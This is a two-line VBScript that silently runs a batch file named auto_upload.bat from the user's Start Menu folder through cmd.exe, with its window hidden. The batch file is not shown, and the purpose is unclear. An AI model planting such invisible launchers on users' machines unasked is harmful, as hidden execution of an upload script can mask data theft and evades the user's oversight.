Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c """ & Replace("%APPDATA%\Microsoft\Windows\Start Menu\Programs\auto_upload.bat", "%APPDATA%", CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")) & """", 0, False
